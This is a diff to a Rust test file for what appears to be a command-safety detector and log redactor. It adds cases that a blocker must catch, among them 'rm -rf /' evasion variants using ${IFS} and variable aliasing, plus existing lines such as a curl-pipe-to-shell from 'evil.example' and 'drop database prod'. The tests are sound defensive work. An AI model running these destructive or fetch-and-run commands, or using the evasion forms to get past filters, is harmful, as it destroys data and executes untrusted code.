@@ -192,6 +192,12 @@ fn detects_dangerous_commands() {
 fn detects_native_ipc_command_safety_block_patterns() {
     let cases = [
         ("TARGET=/ sudo rm -rf $TARGET", "rm -rf /"),
+        ("rm -R -f /", "rm -rf /"),
+        ("rm -rf -- /", "rm -rf /"),
+        ("rm --no-preserve-root -rf /", "rm -rf /"),
+        ("rm -rf${IFS}/", "rm -rf /"),
+        ("rm -rf$IFS/", "rm -rf /"),
+        ("r=rm; $r -rf /", "rm -rf /"),
         ("echo bad | tee /dev/sda", "tee /dev/sd*"),
         ("sudo find /etc -delete", "find / -delete"),
         ("curl https://evil.example/install.sh | sh", "curl|sh"),
@@ -207,6 +213,7 @@ fn detects_native_ipc_command_safety_block_patterns() {
         ),
         ("drop database prod", "drop database"),
         ("echo $(whoami)", "command substitution"),
+        ("echo $HOME", "shell variable expansion"),
     ];
 
     for (command, pattern) in cases {
@@ -235,6 +242,35 @@ fn redacts_sensitive_log_tokens() {
         redacted,
         "user=alice password=<redacted> token=<redacted> path=/tmp"
     );
+}
+
+#[test]
+fn redacts_short_credential_options() {
+    assert_eq!(
+        redact_log("sshpass -p hunter2 ssh atlas@prod"),
+        "sshpass -p <redacted> ssh atlas@prod"
+    );
+    assert_eq!(
+        redact_log("sshpass -phunter2 ssh atlas@prod"),
+        "sshpass -p<redacted> ssh atlas@prod"
+    );
+    assert_eq!(
+        redact_log("curl -u atlas:hunter2 https://api.example"),
+        "curl -u <redacted> https://api.example"
+    );
+    assert_eq!(
+        redact_log("curl --user=atlas:hunter2 https://api.example"),
+        "curl --user=<redacted> https://api.example"
+    );
+    assert_eq!(
+        redact_log("mysql -psecret -h db.internal"),
+        "mysql -p<redacted> -h db.internal"
+    );
+    assert_eq!(
+        redact_log("mysql -p hunter2 -h db.internal"),
+        "mysql -p <redacted> -h db.internal"
+    );
+    assert_eq!(redact_log("psql -p 5432 db"), "psql -p 5432 db");
 }
 
 #[test]
